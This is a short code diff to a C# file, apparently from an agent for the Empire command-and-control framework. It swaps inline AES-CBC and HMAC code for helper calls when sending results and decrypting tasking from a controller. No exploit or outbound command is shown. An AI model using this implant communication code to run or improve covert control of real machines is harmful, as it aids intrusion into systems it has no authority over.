@@ -143,23 +143,7 @@ namespace Sharpire
 
         internal void SendMessage(byte[] packets)
         {
-            byte[] ivBytes = NewInitializationVector(16);
-            byte[] encryptedBytes = new byte[0];
-            using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
-            {
-                aesCrypto.Mode = CipherMode.CBC;
-                aesCrypto.Key = sessionInfo.GetSessionKeyBytes();
-                aesCrypto.IV = ivBytes;
-                ICryptoTransform encryptor = aesCrypto.CreateEncryptor();
-                encryptedBytes = encryptor.TransformFinalBlock(packets, 0, packets.Length);
-            }
-            encryptedBytes = Misc.combine(ivBytes, encryptedBytes);
-
-            HMACSHA256 hmac = new HMACSHA256();
-            hmac.Key = sessionInfo.GetSessionKeyBytes();
-            byte[] hmacBytes = hmac.ComputeHash(encryptedBytes).Take(10).ToArray();
-            encryptedBytes = Misc.combine(encryptedBytes, hmacBytes);
-
+            byte[] encryptedBytes = EmpireStager.AesEncryptThenHmac(sessionInfo.GetSessionKeyBytes(), packets);
             byte[] routingPacket = NewRoutingPacket(encryptedBytes, 5);
 
             Random random = new Random();
@@ -184,7 +168,7 @@ namespace Sharpire
 
         private void ProcessTaskingPackets(byte[] encryptedTask)
         {
-            byte[] taskingBytes = EmpireStager.aesDecrypt(Encoding.ASCII.GetBytes(sessionInfo.GetSessionKey()), encryptedTask);
+            byte[] taskingBytes = EmpireStager.AesDecryptAndVerify(sessionInfo.GetSessionKeyBytes(), encryptedTask);
             PACKET firstPacket = DecodePacket(taskingBytes, 0);
             byte[] resultPackets = ProcessTasking(firstPacket);
             SendMessage(resultPackets);
